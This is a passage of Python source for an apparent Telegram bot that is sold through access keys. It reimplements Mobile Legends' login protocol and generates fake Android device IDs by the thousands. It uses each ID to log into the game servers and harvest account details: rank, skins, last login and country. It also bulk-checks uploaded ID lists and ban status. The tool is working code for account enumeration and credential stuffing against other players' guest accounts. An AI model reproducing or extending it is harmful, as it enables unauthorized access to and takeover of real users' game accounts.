    def _vn(self, v: int) -> bytes:
        r = bytearray()
        while v >= 128:
            r.append(v & 127 | 128)
            v >>= 7
        r.append(v & 127)
        return bytes(r)

    def _hdr(self, t: int, dt: _T):
        self._b += bytes([dt.value << 4 | t]) if t < 15 else bytes([dt.value << 4 | 15]) + self._vn(t)

    def _pk(self, t: int, v: Any):
        if isinstance(v, bool):
            self._hdr(t, _T.IP)
            self._b += self._vn(1 if v else 0)
        elif isinstance(v, int):
            if v < 0:
                self._hdr(t, _T.IN)
                self._b += self._vn(-v)
            else:
                self._hdr(t, _T.IP)
                self._b += self._vn(v)
        elif isinstance(v, float):
            self._hdr(t, _T.DB)
            p = struct.pack('<d', v)
            self._b += self._vn(len(p)) + p
        elif isinstance(v, (str, bytes)):
            self._hdr(t, _T.ST)
            e = v.encode() if isinstance(v, str) else v
            self._b += self._vn(len(e)) + e
        elif isinstance(v, list):
            self._hdr(t, _T.LI)
            self._b += self._vn(len(v))
            for i in v:
                self._pk(0, i)
        elif isinstance(v, dict):
            if isinstance(v, SDP):
                self._hdr(t, _T.SB)
                for k, vv in sorted(v.items()):
                    self._pk(k, vv)
                self._b += bytes([_T.SE.value << 4])
            else:
                self._hdr(t, _T.DI)
                self._b += self._vn(len(v))
                for k, vv in sorted(v.items()):
                    self._pk(0, k)
                    self._pk(0, vv)

    @property
    def data(self) -> bytes:
        return self._b

    def _unpack(self):
        if not self._b:
            return
        if self._b[0] >> 4 == _T.SB.value:
            self._o = 1
        while self._o < len(self._b):
            t, v = self._up()
            if isinstance(v, _T) and v == _T.SE:
                break
            self[t] = v

    def _rn(self) -> int:
        n = 1
        val = self._b[self._o] & 127
        while self._b[self._o + n - 1] >= 128:
            val |= (self._b[self._o + n] & 127) << 7 * n
            n += 1
        self._o += n
        return val

    def _up(self) -> Tuple[int, Any]:
        if self._o >= len(self._b):
            return (0, None)
        h = self._b[self._o]
        t = h & 15
        dt = _T(h >> 4)
        self._o += 1
        if t == 15:
            t = self._rn()
        if dt == _T.IP:
            return (t, self._rn())
        if dt == _T.IN:
            return (t, -self._rn())
        if dt == _T.DB:
            return (t, struct.unpack('<d', self._rn().to_bytes(8, 'little'))[0])
        if dt == _T.ST:
            n = self._rn()
            try:
                vv = self._b[self._o:self._o + n].decode()
            except Exception:
                vv = self._b[self._o:self._o + n]
            self._o += n
            return (t, vv)
        if dt == _T.LI:
            n = self._rn()
            items = []
            for _ in range(n):
                _, i = self._up()
                items.append(i)
            return (t, items)
        if dt == _T.DI:
            n = self._rn()
            d = {}
            for _ in range(n):
                _, k = self._up()
                _, vv = self._up()
                d[k] = vv
            return (t, d)
        if dt == _T.SB:
            sub = {}
            while True:
                st, sv = self._up()
                if isinstance(sv, _T) and sv == _T.SE:
                    break
                sub[st] = sv
            return (t, SDP(sub))
        if dt == _T.SE:
            return (t, _T.SE)
        return (t, None)

def _frame(pid: int, seq: int, payload: bytes) -> bytes:
    pkt = SDP({0: pid, 1: seq, 5: payload}).data
    buf = zstd.compress(pkt)
    return (len(buf) + 4 | 16 << 24).to_bytes(4, 'big') + buf

def _decode(ct: int, d: bytes) -> bytes:
    if ct == 1:
        return zlib.decompress(d)
    if ct == 16:
        return zstd.decompress(d)
    if ct == 2:
        return _aes(d).rstrip(b'\x00')
    if ct == 3:
        return zlib.decompress(_aes(d).rstrip(b'\x00'))
    if ct == 18:
        return zstd.decompress(_aes(d).rstrip(b'\x00'))
    return d

def _gen() -> str:
    imei = ''.join((str(random.randint(0, 9)) for _ in range(15)))
    md5 = hashlib.md5(imei.encode()).hexdigest()
    aid = '%016x' % random.getrandbits(64)
    adv = str(uuid.UUID(int=random.getrandbits(128)))
    return f'and_{md5}{aid}{adv}'

def _login_frame(did: str) -> bytes:
    p = did.split('_')
    info = p[1] if len(p) >= 2 else did
    if len(p) >= 3 and len(info) < 32:
        info += '_' + p[2]
    md5 = info[:32] if len(info) >= 32 else info
    aid = info[32:48] if len(info) >= 48 else ''
    adv = info[48:] if len(info) > 48 else ''
    payload = SDP({0: did, 1: f'gps_adid={adv}&android_id={aid}&device_unique_id={md5}', 2: CLI_VER, 3: CHANNEL, 4: LANG}).data
    return _frame(1, 1, payload)

def _load_pool(path: str) -> List[str]:
    ids = []
    with open(path, encoding='utf-8', errors='ignore') as f:
        for line in f:
            did = line.strip()
            if did and (not did.lower().endswith('none')) and (len(did) >= 40):
                ids.append(did)
    return ids

class _Bucket:
    def __init__(self, rate: float):
        self._rate = rate
        self._tokens = rate
        self._last = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self):
        async with self._lock:
            now = time.monotonic()
            delta = now - self._last
            self._last = now
            self._tokens = min(self._rate, self._tokens + delta * self._rate)
            if self._tokens < 1:
                wait = (1 - self._tokens) / self._rate
                await asyncio.sleep(wait)
                self._tokens = 0
            else:
                self._tokens -= 1

async def _read_n(r: asyncio.StreamReader, n: int) -> bytes:
    buf = b''
    while len(buf) < n:
        c = await r.read(n - len(buf))
        if not c:
            raise EOFError
        buf += c
    return buf

async def _get_game_server(acc, skey, zone, writer_login, reader_login) -> Optional[Tuple[str, int]]:
    try:
        payload = SDP({0: acc, 1: skey, 2: CLI_VER, 5: zone, 6: CHANNEL}).data
        writer_login.write(_frame(5, 2, payload))
        await asyncio.wait_for(writer_login.drain(), timeout=1.0)
        hdr = await asyncio.wait_for(_read_n(reader_login, 4), timeout=READ_TO)
        flags = int.from_bytes(hdr, 'big')
        size = flags & 16777215
        ct = flags >> 24
        body = await asyncio.wait_for(_read_n(reader_login, size - 4), timeout=READ_TO)
        body = _decode(ct, body)
        outer = SDP(body)
        if outer.get(0) != 6:
            return None
        raw = outer.get(6) or outer.get(5)
        if not isinstance(raw, bytes):
            return None
        inner = SDP(raw)
        addr = inner.get(1)
        if not addr or ':' not in str(addr):
            return None
        host, port = str(addr).split(':', 1)
        return host, int(port)
    except Exception:
        return None

async def _get_player_info(acc, skey, zone, did, gs_host, gs_port) -> Optional[SDP]:
    writer = None
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(gs_host, gs_port), timeout=CONN_TO)
        writer = w
        auth_payload = SDP({0: acc, 1: skey, 2: zone, 4: CLI_VER, 13: CHANNEL, 15: did}).data
        w.write(_frame(10001, 1, auth_payload))
        w.write(_frame(10101, 2, SDP({0: 0, 2: 2}).data))
        await asyncio.wait_for(w.drain(), timeout=1.0)
        authed = False
        for _ in range(30):
            try:
                hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                if pid == 10002:
                    authed = True
                    break
                elif pid == 20001:
                    continue
                else:
                    break
            except Exception:
                break
        if not authed:
            return None
        info_payload = SDP({1: int(acc)}).data
        w.write(_frame(11153, 3, info_payload))
        await asyncio.wait_for(w.drain(), timeout=1.0)
        for _ in range(10):
            try:
                hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                if pid == 11154:
                    raw = outer.get(6) or outer.get(5)
                    if isinstance(raw, bytes):
                        return SDP(raw)
                    return None
            except Exception:
                break
        return None
    except Exception:
        return None
    finally:
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

async def _check(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[dict]:
    await bucket.acquire()
    async with sem:
        writer = None
        try:
            frame = _login_frame(did)
            r, w = await asyncio.wait_for(asyncio.open_connection(LOGIN_HOST, LOGIN_PORT), timeout=CONN_TO)
            writer = w
            w.write(frame)
            await asyncio.wait_for(w.drain(), timeout=1.0)
            hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
            flags = int.from_bytes(hdr, 'big')
            size = flags & 16777215
            ct = flags >> 24
            body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
            body = _decode(ct, body)
            outer = SDP(body)
            if outer.get(0) != 2:
                return None
            raw = outer.get(6) or outer.get(5)
            if not isinstance(raw, bytes):
                return None
            inner = SDP(raw)
            acc = inner.get(0)
            if not acc:
                return None
            skey = inner.get(1, '')
            zr = inner.get(2)
            if isinstance(zr, list):
                zones = [z for z in zr if isinstance(z, int)] if zr else [0]
            elif isinstance(zr, dict):
                zones = [zr.get(0, 0)]
            elif isinstance(zr, int):
                zones = [zr]
            else:
                zones = [0]
            zone = zones[0] if zones else 0
            gs_info = await _get_game_server(acc, skey, zone, w, r)
            player_data = None
            if gs_info:
                gs_host, gs_port = gs_info
                gs_result = await _get_player_info(acc, skey, zone, did, gs_host, gs_port)
                if gs_result:
                    player_data = extract_player_data(gs_result)
            return {'did': did, 'acc': acc, 'zone': zone, 'player': player_data}
        except Exception:
            return None
        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

key_manager = KeyManager()

class MLBBBot:
    def __init__(self):
        self.active_tasks = {}
        self.live_stats = {}
        self._executor = ThreadPoolExecutor(max_workers=30)

    def _is_admin(self, user_id: int) -> bool:
        return user_id in ADMIN_IDS

    def _check_access(self, user_id: int) -> bool:
        return key_manager.has_access(user_id)

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        has_access = self._check_access(user_id)
        is_admin = self._is_admin(user_id)
        expiry = key_manager.get_expiry(user_id)
        if is_admin:
            status_line = "Role: Admin"
        elif has_access:
            status_line = f"Access until: {expiry}"
        else:
            status_line = "No active access"
        welcome_msg = (
            f"MLBB Device ID Validator Bot\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"User: {update.effective_user.first_name}\n"
            f"{status_line}\n\n"
        )
        keyboard = []
        if has_access or is_admin:
            keyboard.append([InlineKeyboardButton("📁 Check from File", callback_data="check_file")])
            keyboard.append([InlineKeyboardButton("🎲 Generate & Check", callback_data="generate")])
            keyboard.append([InlineKeyboardButton("🔍 Check Single ID", callback_data="check_single")])
            keyboard.append([InlineKeyboardButton("🚫 Check Ban Status", callback_data="check_ban")])
            keyboard.append([InlineKeyboardButton("🚫 Bulk Ban Check", callback_data="bulk_ban_check")])
        if not has_access and not is_admin:
            welcome_msg += "You need an access key to use this bot.\nUse /redeem <KEY> to activate."
        if is_admin:
            keyboard.append([InlineKeyboardButton("🔑 Admin Panel", callback_data="admin_panel")])
        keyboard.append([InlineKeyboardButton("📋 My Status", callback_data="my_status")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(welcome_msg, reply_markup=reply_markup)

    async def redeem_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /redeem <KEY>")
            return
        key = context.args[0].strip()
        ok, msg = key_manager.redeem_key(key, update.effective_user.id)
        await update.message.reply_text(f"{'✅' if ok else '❌'} {msg}")

    async def genkey_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if not context.args:
            await update.message.reply_text(
                "Usage: /genkey <duration>\n\n"
                "Examples:\n"
                "/genkey 1h — 1 hour\n"
                "/genkey 7d — 7 days\n"
                "/genkey 1m — 1 month\n"
                "/genkey 1y — 1 year\n"
                "/genkey 2w — 2 weeks"
            )
            return
        seconds, label = parse_duration(context.args[0])
        if seconds is None:
            await update.message.reply_text("❌ Invalid duration.\nUse: 1h, 7d, 1m, 1y, 2w")
            return
        key = key_manager.generate_key(seconds, label, update.effective_user.id)
        await update.message.reply_text(
            f"✅ Key Generated!\n\nKey: `{key}`\nDuration: {label}\n\nRedeem: /redeem {key}",
            parse_mode='Markdown'
        )

    async def listkeys_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        keys = key_manager.list_keys(show_used=False)
        if not keys:
            await update.message.reply_text("No unused keys.")
            return
        lines = ["🔑 Unused Keys:\n"]
        for k in keys[:20]:
            lines.append(f"`{k['key']}` — {k['label']}")
        await update.message.reply_text("\n".join(lines), parse_mode='Markdown')

    async def listusers_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        users = key_manager.list_users()
        if not users:
            await update.message.reply_text("No users.")
            return
        lines = ["👥 Users:\n"]
        for u in users[:30]:
            status = "✅" if u["active"] else "❌"
            lines.append(f"{status} UID: {u['uid']} | Expires: {u['expires']}")
        await update.message.reply_text("\n".join(lines))

    async def revoke_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /revoke <user_id>")
            return
        try:
            target = int(context.args[0])
        except ValueError:
            await update.message.reply_text("Invalid user ID.")
            return
        ok = key_manager.revoke_user(target)
        await update.message.reply_text(f"{'✅ Revoked.' if ok else '❌ Not found.'}")

    async def delkey_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /delkey <KEY>")
            return
        ok = key_manager.delete_key(context.args[0])
        await update.message.reply_text(f"{'✅ Deleted.' if ok else '❌ Not found.'}")

    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        is_admin = self._is_admin(update.effective_user.id)
        help_text = (
            "Commands:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "/start — Main menu\n"
            "/redeem <KEY> — Activate key\n"
            "/check <device_id> — Check single device ID\n"
            "/bancheck <device_id> — Check if device is banned\n"
            "/bulkban — Bulk ban check (reply to txt file)\n"
            "/help — Show this\n"
        )
        if is_admin:
            help_text += (
                "\nAdmin:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "/genkey <dur> — Generate key\n"
                "/listkeys — Unused keys\n"
                "/listusers — All users\n"
                "/revoke <uid> — Revoke access\n"
                "/delkey <KEY> — Delete key\n"
            )
        await update.message.reply_text(help_text)

    async def bulk_ban_check_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle bulk ban check callback"""
        query = update.callback_query
        user_id = query.from_user.id
        
        if not self._check_access(user_id):
            await query.answer("❌ No access. /redeem <KEY>", show_alert=True)
            return
        
        await query.answer()
        await query.edit_message_text(
            "🚫 **Bulk Ban Check**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Send a `.txt` file with device IDs (one per line).\n\n"
            "The bot will check each ID for ban status.\n"
            "Results will be saved and sent back to you.",
            parse_mode='Markdown'
        )
        context.user_data['mode'] = 'bulk_ban'

    async def check_ban_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Fast ban check for a single device"""
        user_id = update.effective_user.id
        
        if not self._check_access(user_id):
            await update.message.reply_text("❌ No access. Use /redeem <KEY> to activate.")
            return
        
        device_id = None
        if context.args:
            device_id = context.args[0].strip()
        elif update.message.reply_to_message:
            replied_text = update.message.reply_to_message.text
            if replied_text:
                words = replied_text.split()
                for word in words:
                    if len(word) >= 40 and ('_' in word or word.startswith('and_')):
                        device_id = word.strip()
                        break
        
        if not device_id:
            await update.message.reply_text(
                "❌ **No Device ID Provided**\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "**Usage:** `/bancheck <device_id>`\n\n"
                "**Example:**\n"
                "`/bancheck and_1234567890abcdef1234567890abcdef12345678`",
                parse_mode='Markdown'
            )
            return
        
        if len(device_id) < 40:
            await update.message.reply_text(
                "❌ **Invalid Device ID**\n"
                f"ID: `{device_id}`\n\n"
                "Device ID must be at least 40 characters long.",
                parse_mode='Markdown'
            )
            return
        
        status_msg = await update.message.reply_text(
            f"🔍 **Checking Ban Status...**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔑 **DevID:** `{device_id[:20]}...{device_id[-10:]}`\n\n"
            f"⏳ Checking...",
            parse_mode='Markdown'
        )
        
        try:
            # Run ban check in thread pool for speed
            loop = asyncio.get_event_loop()
            status, ban_info = await loop.run_in_executor(
                self._executor, check_device_ban_silent, device_id
            )
            
            if status == "BANNED":
                response = (
                    f"🚫 **Device is BANNED!**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔑 **DevID:** `{device_id[:20]}...{device_id[-10:]}`\n\n"
                    f"{format_ban_info(ban_info)}\n\n"
                    f"⚠️ This device/account has been banned."
                )
                await status_msg.edit_text(response, parse_mode='Markdown')
                
            elif status == "CLEAN":
                response = (
                    f"✅ **Device is CLEAN**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔑 **DevID:** `{device_id[:20]}...{device_id[-10:]}`\n\n"
                    f"✅ No ban detected."
                )
                await status_msg.edit_text(response, parse_mode='Markdown')
                
            else:
                response = (
                    f"❌ **Unable to Check**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔑 **DevID:** `{device_id[:20]}...{device_id[-10:]}`\n\n"
                    f"Could not determine ban status.\n\n"
                    f"**Possible reasons:**\n"
                    f"• Invalid Device ID\n"
                    f"• Account not registered\n"
                    f"• Server unavailable"
                )
                await status_msg.edit_text(response, parse_mode='Markdown')
                
        except Exception as e:
            logger.error(f"Ban check error: {e}")
            await status_msg.edit_text(
                f"❌ **Error**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Error: `{str(e)}`"
            )

    async def check_ban_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle the check_ban callback"""
        query = update.callback_query
        user_id = query.from_user.id
        
        if not self._check_access(user_id):
            await query.answer("❌ No access. /redeem <KEY>", show_alert=True)
            return
        
        await query.answer()
        await query.edit_message_text(
            "🚫 **Check Ban Status**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Send the device ID you want to check for bans.\n\n"
            "**Usage:** `/bancheck <device_id>`\n\n"
            "**Example:**\n"
            "`/bancheck and_1234567890abcdef1234567890abcdef12345678`",
            parse_mode='Markdown'
        )
        context.user_data['mode'] = 'ban_check'

    async def check_single(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        
        if not self._check_access(user_id):
            await query.answer("❌ No access. /redeem <KEY>", show_alert=True)
            return
        
        await query.answer()
        await query.edit_message_text(
            "🔍 **Check Single Device ID**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Send the device ID you want to check.\n\n"
            "Example: `and_1234567890abcdef1234567890abcdef12345678`\n\n"
            "You can also use: `/check <device_id>`",
            parse_mode='Markdown'
        )
        context.user_data['mode'] = 'single_check'

    async def check_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not self._check_access(user_id):
            await update.message.reply_text("❌ No access. Use /redeem <KEY> to activate.")
            return
        
        device_id = None
        if context.args:
            device_id = context.args[0].strip()
        elif update.message.reply_to_message:
            replied_text = update.message.reply_to_message.text
            if replied_text:
                words = replied_text.split()
                for word in words:
                    if len(word) >= 40 and ('_' in word or word.startswith('and_')):
                        device_id = word.strip()
                        break
        
        if not device_id:
            await update.message.reply_text(
                "❌ **No Device ID Provided**\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "**Usage:** `/check <device_id>`\n\n"
                "**Example:**\n"
                "`/check and_1234567890abcdef1234567890abcdef12345678`",
                parse_mode='Markdown'
            )
            return
        
        if len(device_id) < 40:
            await update.message.reply_text(
                "❌ **Invalid Device ID**\n"
                f"ID: `{device_id}`\n\n"
                "Device ID must be at least 40 characters long.",
                parse_mode='Markdown'
            )
            return
        
        if user_id in self.active_tasks and not self.active_tasks[user_id]['done']:
            await update.message.reply_text("⏳ A task is already running.")
            return
        
        status_msg = await update.message.reply_text(
            f"🔍 **Checking Device ID...**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔑 **DevID:** `{device_id[:20]}...{device_id[-10:]}`\n\n"
            f"⏳ Connecting...",
            parse_mode='Markdown'
        )
        
        try:
            sem = asyncio.Semaphore(1)
            bucket = _Bucket(1)
            start_time = time.monotonic()
            result = await _check(device_id, sem, bucket)
            elapsed = time.monotonic() - start_time
            
            if result and result.get('player'):
                player = result['player']
                prev_heroes = ", ".join(player["prev_heroes"]) if player["prev_heroes"] else "N/A"
                
                response = (
                    f"✅ **Valid Device ID**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📱 **Account:** `{result['acc']}`\n"
                    f"🌍 **Zone:** `{result['zone']}`\n"
                    f"🔑 **DevID:** `{result['did'][:20]}...{result['did'][-10:]}`\n\n"
                    f"👤 **Name:** {player['nickname']}\n"
                    f"📊 **Level:** {player['level']}\n"
                    f"🏆 **Rank:** {player['current_rank']}\n"
                    f"⭐ **Highest Rank:** {player['high_rank']}\n"
                    f"🎨 **Skins:** {player['skin_count']:,}\n"
                    f"🦸 **Heroes:** {player['hero_count']:,}\n"
                    f"⚔️ **Battles:** {player['total_battles']:,}\n"
                    f"📈 **Win Rate:** {player['win_rate']}\n"
                    f"🎯 **Last Hero:** {player['last_hero']}\n"
                    f"📜 **Recent Heroes:** {prev_heroes}\n"
                    f"🛡️ **Squad:** {player['squad']}\n"
                    f"💎 **Collector:** {player['collector_tier']}\n"
                    f"❤️ **Affinity:** {player['affinity']}\n"
                    f"⏰ **Last Login:** {player['last_login']}\n"
                    f"🌐 **Country:** {player['last_login_country']}\n"
                    f"📅 **Registered:** {player['create_country']}\n"
                    f"⏱️ **Check Time:** {elapsed:.2f}s"
                )
                await status_msg.edit_text(response, parse_mode='Markdown')
                
                if user_id in self.live_stats:
                    self.live_stats[user_id].add_hit(result)
                
            elif result:
                response = (
                    f"⚠️ **Partial Result**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📱 **Account:** `{result['acc']}`\n"
                    f"🌍 **Zone:** `{result['zone']}`\n"
                    f"🔑 **DevID:** `{result['did'][:20]}...{result['did'][-10:]}`\n\n"
                    f"❌ **Player Info:** Not available\n"
                    f"⏱️ **Check Time:** {elapsed:.2f}s"
                )
                await status_msg.edit_text(response, parse_mode='Markdown')
            else:
                await status_msg.edit_text(
                    f"❌ **Invalid or Unregistered Device ID**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔑 **DevID:** `{device_id[:20]}...{device_id[-10:]}`\n\n"
                    f"⏱️ **Check Time:** {elapsed:.2f}s"
                )
                
        except Exception as e:
            logger.error(f"Check command error: {e}")
            await status_msg.edit_text(f"❌ Error: `{str(e)}`")

    async def check_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.callback_query.answer("❌ No access.", show_alert=True)
            return
        if user_id in self.active_tasks and not self.active_tasks[user_id]['done']:
            await update.callback_query.answer("Task running!", show_alert=True)
            return
        await update.callback_query.answer()
        await update.callback_query.edit_message_text("📁 Send .txt file with device IDs (one per line).")
        context.user_data['mode'] = 'file'

    async def generate(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self._check_access(user_id):
            await update.callback_query.answer("❌ No access.", show_alert=True)
            return
        if user_id in self.active_tasks and not self.active_tasks[user_id]['done']:
            await update.callback_query.answer("Task running!", show_alert=True)
            return
        await update.callback_query.answer()
        context.user_data['mode'] = 'generate'
        await update.callback_query.edit_message_text("🎲 How many IDs? Send a number (1-50000)")

    async def my_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        is_admin = self._is_admin(user_id)
        expiry = key_manager.get_expiry(user_id)
        has_access = self._check_access(user_id)
        if is_admin:
            status = "Role: Admin (Unlimited)"
        elif has_access:
            status = f"Active until: {expiry}"
        else:
            status = "No access\n/redeem <KEY>"
        await query.edit_message_text(
            f"📋 My Status\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nID: {user_id}\n{status}"
        )

    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("❌ Admin only.", show_alert=True)
            return
        await query.answer()
        keys = key_manager.list_keys(show_used=False)
        users = key_manager.list_users()
        active_users = sum(1 for u in users if u["active"])
        keyboard = [
            [InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey")],
            [InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys")],
            [InlineKeyboardButton("👥 List Users", callback_data="admin_listusers")],
            [InlineKeyboardButton("◀ Back", callback_data="back_main")]
        ]
        await query.edit_message_text(
            f"🔑 Admin Panel\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Unused Keys: {len(keys)}\nTotal Users: {len(users)}\nActive: {active_users}\n\n"
            f"/genkey <dur> | /listkeys | /listusers\n/revoke <uid> | /delkey <key>",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def admin_genkey_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("❌", show_alert=True)
            return
        await query.answer()
        keyboard = [
            [
                InlineKeyboardButton("1 Hour", callback_data="genkey_1h"),
                InlineKeyboardButton("6 Hours", callback_data="genkey_6h"),
                InlineKeyboardButton("12 Hours", callback_data="genkey_12h"),
            ],
            [
                InlineKeyboardButton("1 Day", callback_data="genkey_1d"),
                InlineKeyboardButton("3 Days", callback_data="genkey_3d"),
                InlineKeyboardButton("7 Days", callback_data="genkey_7d"),
            ],
            [
                InlineKeyboardButton("14 Days", callback_data="genkey_14d"),
                InlineKeyboardButton("1 Month", callback_data="genkey_1m"),
                InlineKeyboardButton("3 Months", callback_data="genkey_3m"),
            ],
            [
                InlineKeyboardButton("6 Months", callback_data="genkey_6m"),
                InlineKeyboardButton("1 Year", callback_data="genkey_1y"),
            ],
            [InlineKeyboardButton("◀ Back", callback_data="admin_panel")]
        ]
        await query.edit_message_text("🔑 Generate Key\nSelect duration:", reply_markup=InlineKeyboardMarkup(keyboard))

    async def admin_listkeys_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("❌", show_alert=True)
            return
        await query.answer()
        keys = key_manager.list_keys(show_used=False)
        if not keys:
            text = "No unused keys."
        else:
            lines = [f"🔑 Unused Keys ({len(keys)}):\n"]
            for k in keys[:15]:
                lines.append(f"`{k['key']}` — {k['label']}")
            text = "\n".join(lines)
        keyboard = [[InlineKeyboardButton("◀ Back", callback_data="admin_panel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

    async def admin_listusers_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        if not self._is_admin(query.from_user.id):
            await query.answer("❌", show_alert=True)
            return
        await query.answer()
        users = key_manager.list_users()
        if not users:
            text = "No users."
        else:
            lines = [f"👥 Users ({len(users)}):\n"]
            for u in users[:15]:
                s = "✅" if u["active"] else "❌"
                lines.append(f"{s} {u['uid']} | {u['expires']}")
            text = "\n".join(lines)
        keyboard = [[InlineKeyboardButton("◀ Back", callback_data="admin_panel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    async def handle_bulk_ban_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle bulk ban check from file"""
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        
        if not self._check_access(user_id):
            await update.message.reply_text("❌ No access. /redeem <KEY>")
            return
        
        file = update.message.document
        if not file.file_name.endswith('.txt'):
            await update.message.reply_text("Send a .txt file")
            return
        
        status_msg = await update.message.reply_text(f"📥 Processing {file.file_name}...")
        file_obj = await file.get_file()
        file_path = f"temp_ban_{user_id}_{int(time.time())}.txt"
        await file_obj.download_to_drive(file_path)
        
        # Load IDs
        ids = []
        with open(file_path, encoding='utf-8', errors='ignore') as f:
            for line in f:
                did = line.strip()
                if did and len(did) >= 40:
                    ids.append(did)
        
        os.remove(file_path)
        
        if not ids:
            await status_msg.edit_text("❌ No valid IDs found.")
            return
        
        await status_msg.edit_text(f"✅ Loaded {len(ids):,} IDs. Starting bulk ban check...")
        
        try:
            # Run bulk check in thread pool
            loop = asyncio.get_event_loop()
            results = await loop.run_in_executor(
                self._executor, BulkBanChecker.check_batch, ids, 30
            )
            
            # Generate report
            banned_count = len(results["banned"])
            clean_count = len(results["clean"])
            unknown_count = len(results["unknown"])
            
            report_lines = [
                f"📊 **Bulk Ban Check Results**",
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                f"",
                f"Total Checked: {len(ids):,}",
                f"🚫 Banned: {banned_count:,}",
                f"✅ Clean: {clean_count:,}",
                f"❓ Unknown: {unknown_count:,}",
                f"",
            ]
            
            # Send results
            if results["banned"]:
                # Create banned file
                banned_file = f"banned_{user_id}_{int(time.time())}.txt"
                with open(banned_file, 'w', encoding='utf-8') as f:
                    for did, info in results["banned"]:
                        f.write(f"{did} | BANNED | {info.get('reason_name', 'Unknown')}\n")
                
                with open(banned_file, 'rb') as f:
                    await context.bot.send_document(
                        chat_id, f,
